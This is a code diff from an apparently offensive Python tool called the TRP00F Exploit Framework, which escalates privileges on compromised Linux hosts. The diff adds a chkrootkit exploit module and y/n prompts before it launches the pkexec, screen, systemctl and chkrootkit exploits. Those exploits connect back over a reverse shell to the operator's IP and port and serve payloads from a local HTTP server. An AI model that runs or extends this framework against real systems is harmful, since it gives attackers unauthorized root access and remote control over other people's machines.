@@ -17,6 +17,7 @@ from plugin.pkexec import pkexec
 from plugin.base import base
 from plugin.screen_450 import screen
 from plugin.systemctl import systemctl
+from plugin.chkrootkit import chkrootkit
 
 
 logo = '''
@@ -61,10 +62,10 @@ class TRP00F:
     def start(self):
         try:
             client = self.server.wait_for_connection()
-            print(f"[+] Trying to escalate privileges on {client.rhost}, reverse shell to {self.local_ip}")
+            print(f"[+] Trying to escalate privileges on {client.rhost}, reverse shell to {self.reverse_ip}:{self.reverse_port}")
             self.interact_with_shell(client)
         except KeyboardInterrupt:
-            print("Server shutting down.")
+            print("[-] Server shutting down.")
         finally:
             self.server.close()
 
@@ -93,11 +94,17 @@ class TRP00F:
     def lin(self, sock):
         res = base(self.reverse_ip, self.reverse_port).check(sock,self.password)
         if res['pkexec']:
-            pkexec(sock, self.local_ip, self.http_port, self.reverse_ip, self.reverse_port)
+            if input(f"[!] Do you want to exploit the vulnerability in file 'pkexec' ? (y/n) >").strip().lower() == 'y':
+                pkexec().exploit(sock, self.local_ip, self.http_port, self.reverse_ip, self.reverse_port)
         if res['screen']:
-            screen(sock, self.local_ip, self.http_port, self.reverse_ip, self.reverse_port)
+            if input(f"[!] Do you want to exploit the vulnerability in file 'screen' ? (y/n) >").strip().lower()  == 'y':
+                screen().exploit(sock, self.local_ip, self.http_port, self.reverse_ip, self.reverse_port)
         if res['systemctl']:
-            systemctl(sock, self.local_ip, self.http_port, self.reverse_ip, self.reverse_port)
+            if input(f"[!] Do you want to exploit the vulnerability in file 'systemctl' ? (y/n) >").strip().lower()  == 'y':
+                systemctl().exploit(sock, self.local_ip, self.http_port, self.reverse_ip, self.reverse_port)
+        if res['chkrootkit']:
+            if input(f"[!] Do you want to exploit the vulnerability in file 'chkrootkit' ? (y/n) >").strip().lower()  == 'y':
+                chkrootkit().exploit(sock, self.local_ip, self.http_port, self.reverse_ip, self.reverse_port)
         lxc(sock, self.local_ip, self.http_port)
 
     def win(self, client):
@@ -110,6 +117,7 @@ class TRP00F:
         http_thread.start()
 
 if __name__ == '__main__':
+
     print(logo)
     parser = argparse.ArgumentParser(description='TRP00F Exploit Framework')
     parser.add_argument('--lhost', required=True, help='Local IP address to bind the server')
